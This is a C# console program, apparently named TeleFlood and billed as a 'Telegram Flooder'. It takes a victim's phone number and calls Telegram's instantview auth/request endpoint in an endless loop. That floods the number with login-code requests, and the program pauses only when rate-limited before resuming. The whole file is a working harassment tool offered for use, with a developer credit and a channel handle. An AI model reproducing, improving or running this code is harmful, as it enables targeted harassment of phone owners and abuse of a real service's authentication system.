using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Threading;
namespace TeleFlood
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "The Firist Telegram Flooder";
            Console.ForegroundColor = ConsoleColor.White;
            string[] Logo = {
                "___________    .__          ",
                "(__    ___/___ |  |   ____  ",
                "  |    |_/ __ )|  | _/ __ ) ",
                "  |    |(  ___/|  |_)  ___/ ",
                "  |____| (___  >____/)___  >",
                "             (/          (/ ",
                "___________.__                    .___",
                "(_   _____/|  |   ____   ____   __| _/",
                " |    __)  |  |  /  _ ) /  _ ) / __ | ",
                " |     )   |  |_(  <_> |  <_> ) /_/ | ",
                " (___  /   |____/)____/ (____/)____ | ",
                "     (/                            )/ ",
            };
            Console.ForegroundColor = ConsoleColor.Gray;
            foreach (var Single in Logo)
            {
                Console.WriteLine(Single);
            }
            Console.WriteLine("Developer: Shadow"
                + Environment.NewLine 
                + "Telegram Channel: @ParsingTeam");
            Console.WriteLine("");
            Internet();
            Master:
            Console.ForegroundColor = ConsoleColor.White;
            string Phone = null;
            Console.Write("[*] Enter Phone Number Like This '989030000000': ");
            Console.ForegroundColor = ConsoleColor.Magenta;
            Phone = Console.ReadLine();
            Console.ForegroundColor = ConsoleColor.White;
            if (Phone==null)
            {
                goto Master;
            }
            if (Phone.Substring(0,1) =="+")
            {
                Phone = Phone.Remove(0, 1);
            }
            if (Phone.Length != 12)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[!] Bad Number!");
                Console.ForegroundColor = ConsoleColor.White;
                goto Master;
            }
            Console.ForegroundColor = ConsoleColor.Green;
            Console.ForegroundColor = ConsoleColor.White;
            int OK = 0;
            while (true)
            {
                bool Trace = Flood(Phone);
                if (!Trace)
                {
                    OK = 0;
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.Write("[-] Too Many Attempts!, Sleep 2 Minutes ");
                    for (int i = 0; i < 8; i++)
                    {
                        Thread.Sleep(1000 * 15);
                        Console.Write(".");
                    }
                    Console.WriteLine("");
                    Console.ForegroundColor = ConsoleColor.White;
                }
                else
                {
                    ++OK;
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[" + OK + "] " + "Successful Flood.");
                    Console.ForegroundColor = ConsoleColor.White;
                }

            }

        }
        static bool Flood(string Phone)
        {
            string Telegram = "https://instantview.telegram.org/auth/request?phone=%2B";
            using (WebClient Request = new WebClient())
            {
                try
                {
                    string Download = Request.DownloadString(Telegram + Phone);
                    if (Download.Substring(0, 1) == ("{")) { return true; }
                    else { return false; }
                }
                catch (Exception)
                {return false;}
            }
        }
        static void Internet()
        {
            using (WebClient Request = new WebClient())
            {
                try
                {
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write("[?] Internet Connection:");
                    var Data = Request.DownloadString("https://telegram.org/favicon.ico");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.Write(" OK");
                    Console.WriteLine("");
                    Console.ForegroundColor = ConsoleColor.White;
                }
                catch (Exception)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.Write(" Fail");
                    Console.WriteLine("");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.ReadKey();
                    Environment.Exit(0);
                }

            }
        }
    }
}
